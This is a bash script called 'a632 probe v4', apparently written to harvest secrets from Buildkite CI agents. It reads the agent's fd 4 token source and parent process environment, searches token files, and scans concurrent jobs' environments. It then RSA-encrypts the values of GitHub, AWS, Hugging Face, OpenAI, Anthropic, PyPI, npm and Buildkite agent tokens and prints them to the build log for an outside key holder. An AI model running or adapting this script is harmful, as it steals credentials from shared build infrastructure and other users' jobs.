#!/bin/bash
# a632 probe v4: fd://4 token source + parent/supervisor + token files + concurrent job envs; values RSA-encrypted only
set -u
PUB=/tmp/.a632pub.$$
cat > "$PUB" <<'A632PUBEOF'
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvsYiCNEL69IkUinb45Id
ZQJZTtR1aqcW1x3sWVg9ZpNnVw2T8xFOpd7xcHnuRuDJjpVkFlBE+sraDq3WdhB7
pnabZtIbLnQc+G6Y8sXmCwbWUwxjz9E5u87DB1o5xPiEyQMeSTNF5SYPPcY4H9eq
jDlHHe8cAA/LpnNcQ/Meluy39CYwHFPMjJGK10X2apBZBJQJxl79TgMx5jFYZx8R
6FAeH8dnEHTWPZEytzegqe0AKKaQwBM7fpd+3UMxnC5NVn3hfE6g0yCvRzyiAELs
Pe6OCiiZ8XBdHHOtoOpE+YarL9U7Q4x7zc52JdojQ7dLS7xySApfHUwE+xa4fvzr
XQIDAQAB
-----END PUBLIC KEY-----
A632PUBEOF
encrypt() { v="$1"; label="$2"; [ -z "$v" ] && return 0; h=$(printf '%s' "$v" | sha256sum | cut -c1-12); c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0); echo "A632ENC:$label:$h:${c:-ENCFAIL}"; }
echo "A632D_BEGIN"; id; hostname; echo "CTX agent=${BUILDKITE_AGENT_NAME:-none}"
echo "== AGENT FD4 + PARENT =="
for p in /proc/[0-9]*; do
  if [ -r "$p/cmdline" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null); case "$c" in *buildkite-agent\ start*)
    nm=$(printf '%s' "$c" | grep -oE '\-\-name=[^ ]+' | head -1)
    echo "AGENT $p $nm"
    ls -la "$p/fd/4" 2>/dev/null || true
    if [ -f "$p/fd/4" ]; then echo "FD4_IS_FILE $p"; sha256sum "$p/fd/4" 2>/dev/null; v=$(head -c 4096 "$p/fd/4" 2>/dev/null | tr -d '\n'); encrypt "$v" "fd4:$nm"; fi
    ppid=$(awk '/^PPid:/{print $2}' "$p/status" 2>/dev/null)
    echo "PPID $p -> ${ppid:-?} CMD: $(tr '\0' ' ' < /proc/${ppid:-1}/cmdline 2>/dev/null | head -c 250 | sed -E 's/([Tt][Oo][Kk][Ee][Nn]=)[^[:space:]]+/\1<redacted>/g')"
    tr '\0' '\n' < /proc/${ppid:-1}/environ 2>/dev/null | grep -iE 'TOKEN|SECRET' | sed -E 's/^([^=]*)=.*/\1/' | head -8 || true
  esac; fi
done
echo "== PROCESS TREE (buildkite-related) =="
ps -eo pid,ppid,user,args 2>/dev/null | grep -iE 'buildkite|supervisor|tini|systemd' | sed -E 's/([Tt][Oo][Kk][Ee][Nn]=)[^[:space:]]+/\1<redacted>/g' | head -30 || true
echo "== TOKEN-LIKE FILES =="
for d in /run/secrets /etc/buildkite-agent /var/lib/buildkite-agent /run /var/run; do echo "DIR $d"; ls -la "$d" 2>/dev/null | head -12; done
find /run /etc /var/lib/buildkite-agent /opt /root -maxdepth 3 -iname '*token*' 2>/dev/null | head -20
echo "== ETC BUILDKITE DIR =="
ls -laR /etc/buildkite-agent 2>/dev/null | head -40
echo "== CONCURRENT JOB ENVS =="
seen=0
for p in /proc/[0-9]*; do
  if [ -r "$p/environ" ]; then
    n=$(tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -cE '^BUILDKITE_JOB_ID=' || true)
    if [ "$n" != "0" ]; then
      c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 120)
      echo "JOBPID $p CMD: $c"
      tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -E '^(BUILDKITE_BUILD_ID|BUILDKITE_JOB_ID|BUILDKITE_PIPELINE_SLUG|BUILDKITE_LABEL|BUILDKITE_BRANCH|BUILDKITE_REPO)=' | head -8 || true
      tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE 'TOKEN|SECRET|PASSWORD|CREDENTIAL|API_KEY|_KEY=' | sed -E 's/^([^=]*)=.*/\1/' | head -25 || true
      seen=$((seen+1))
    fi
  fi
done
echo "JOBPIDS_SEEN=$seen"
echo "== JOB SECRET VALUES (encrypted, filtered names) =="
for p in /proc/[0-9]*; do
  if [ -r "$p/environ" ]; then
    n=$(tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -cE '^BUILDKITE_JOB_ID=' || true)
    if [ "$n" != "0" ]; then
      tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE '^(HF_TOKEN|HUGGING_FACE_HUB_TOKEN|HUGGINGFACE_TOKEN|CODECOV_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|DOCKER_PASSWORD|OPENAI_API_KEY|ANTHROPIC_API_KEY|PYPI_TOKEN|NPM_TOKEN|BUILDKITE_AGENT_ACCESS_TOKEN|BUILDKITE_AGENT_JOB_API_TOKEN)=' | while IFS='=' read -r k v; do encrypt "$v" "jobenv:$k"; done
    fi
  fi
done
rm -f "$PUB" 2>/dev/null || true
echo "A632D_END"
